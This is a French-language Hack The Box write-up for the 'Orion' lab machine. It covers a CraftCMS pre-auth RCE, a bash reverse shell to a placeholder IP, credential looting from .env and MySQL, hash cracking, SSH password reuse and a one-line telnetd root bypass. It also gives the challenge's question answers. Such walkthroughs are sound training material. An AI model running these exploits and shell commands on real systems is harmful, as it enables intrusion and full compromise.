[⬅ Retour à Machines](README.md) · [🏠 Accueil du repo](../../README.md)

# Machine 2 — Orion

*CraftCMS 5.6.16 pre-auth RCE (CVE-2025-32432) + telnetd auth bypass
(CVE-2026-24061) — Easy Linux*

## Concept

Site web CraftCMS 5.6.16 exposé sur orion.htb. La version est vulnérable
à une RCE pré-authentifiée (CVE-2025-32432) via l’endpoint d’image
transform (object injection Yii2 + empoisonnement de session PHP). Après
obtention d’un shell www-data, le fichier .env révèle les credentials
MySQL. Le hash bcrypt de l’utilisateur adam est cracké (darkangel) et
réutilisé pour SSH. La privesc exploite un telnetd GNU inetutils 2.7
local (127.0.0.1:23) vulnérable à un authentication bypass via la
variable d’environnement USER (CVE-2026-24061).

```mermaid
flowchart LR
    A["nmap -sC -sV"] --> B["CraftCMS 5.6.16<br/>sur orion.htb"]
    B --> C["CVE-2025-32432<br/>RCE pre-auth Yii2"]
    C --> D["Shell www-data"]
    D --> E["Lecture .env<br/>credentials MySQL"]
    E --> F["Dump table users<br/>hash bcrypt adam"]
    F --> G["hashcat -m 3200<br/>→ darkangel"]
    G --> H["SSH adam@orion.htb"]
    H --> I["ss -tulnp<br/>telnetd sur 127.0.0.1:23"]
    I --> J["CVE-2026-24061<br/>USER='-f root'"]
    J --> K["Shell root"]
```

## Méthodologie — commandes complètes

echo "10.129.x.x orion.htb" \| sudo tee -a /etc/hosts

nmap -sC -sV 10.129.x.x

\# → 22/tcp SSH (OpenSSH 8.9p1), 80/tcp HTTP (nginx → orion.htb)

\# Version CraftCMS

curl -s http://orion.htb/admin/login \| grep -o "Craft CMS \[0-9.\]\*"

\# → Craft CMS 5.6.16

\# --- Foothold : CVE-2025-32432 (RCE pre-auth) ---

\# Option 1 : Metasploit

msfconsole -q

use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432

set RHOSTS orion.htb

set RPORT 80

set LHOST \<TON_IP_TUN0\>

set LPORT 4444

run

\# → shell www-data

\# Option 2 : PoC Python

git clone https://github.com/c0gnit00/CVE-2025-32432

cd CVE-2025-32432 && pip3 install requests urllib3

python3 exploit.py -u http://orion.htb -c "id"

\# Reverse shell :

python3 exploit.py -u http://orion.htb -c "bash -c 'bash -i \>&
/dev/tcp/\<IP\>/4444 0\>&1'"

\# --- User : adam ---

cat /var/www/html/craft/.env

\# CRAFT_DB_USER=root

\# CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!

\# CRAFT_DB_DATABASE=orion

mysql -u root -p'SuperSecureCraft123Pass!' orion -e "SELECT username,
email, password FROM users;"

\# → hash bcrypt de adam

\# Crack sur Kali

hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

\# → darkangel

ssh adam@orion.htb

\# Password : darkangel

cat /home/adam/user.txt

\# --- Privilege escalation : CVE-2026-24061 ---

ss -tulnp \| grep 23

\# → 127.0.0.1:23 (telnetd)

telnet --version

\# → GNU inetutils 2.7

USER="-f root" telnet -a 127.0.0.1

\# ou : env USER='-f root' telnet -a 127.0.0.1 23

\# → shell root immédiat

cat /root/root.txt

## Flags

| **Flag** | **Valeur**                                  |
|----------|---------------------------------------------|
| User     | (unique à l’instance — /home/adam/user.txt) |
| Root     | (unique à l’instance — /root/root.txt)      |

## Réponses aux questions HTB

| **Question**                                                         | **Réponse** |
|----------------------------------------------------------------------|-------------|
| How many open TCP ports are listening on Orion?                      | 2           |
| What is the version of CraftCMS running on the target?               | 5.6.16      |
| Which user is running CraftCMS?                                      | www-data    |
| Which file contains the password for the MySQL database?             | .env        |
| What is the password that can be obtained from the MySQL database?   | darkangel   |
| Which service, unrelated to CraftCMS, is open only locally on Orion? | telnet      |
| What is the version of the service found?                            | 2.7         |

## Points clés

• Toujours identifier la version exacte d’un CMS (footer, /admin/login,
headers, composer.lock) — elle détermine directement les CVE
applicables.

• CVE-2025-32432 (CraftCMS ≤ 5.6.16) : RCE pre-auth via object injection
Yii2 sur l’endpoint generate-transform + empoisonnement de session PHP.
Metasploit ou PoC public suffisent.

• Le fichier .env de CraftCMS contient presque toujours les credentials
de la base de données en clair — premier réflexe après un shell web.

• Réutilisation de mot de passe entre l’application (Craft admin) et le
système (SSH) : très fréquent sur les boxes Easy.

• Les services qui n’écoutent que sur 127.0.0.1 (telnet, MySQL, etc.)
sont invisibles depuis l’extérieur — toujours ré-énumérer les ports
après avoir un shell.

• CVE-2026-24061 (GNU inetutils telnetd ≤ 2.7) : authentication bypass
trivial via USER="-f root". Un one-liner donne root.

## Leçon retenue

*Une RCE pre-auth sur un CMS mal patché, combinée à des credentials en
clair dans un .env et à un service legacy local (telnetd) vulnérable à
un bypass trivial, suffit à passer de zéro à root en quelques étapes.
Toujours vérifier les services locaux et les fichiers de configuration
d’application après un premier shell.*

## Ce que ces machines enseignent (suite)

• Toujours fingerprint la version exacte d’un CMS / framework — elle
conditionne les CVE exploitables.

• Après un shell web, lire systématiquement les fichiers .env,
config.php, database.yml, etc.

• Ré-énumérer les ports locaux (ss -tulnp) : les services 127.0.0.1 sont
souvent le chemin vers root.

• Les services legacy (telnetd, rsh, etc.) exposés localement restent
des vecteurs de privesc très efficaces.

*Prochaine machine à documenter ici dès qu’elle sera résolue.*

---

[⬅ Précédent : Cap](cap.md) · [⬆ Index Machines](README.md)
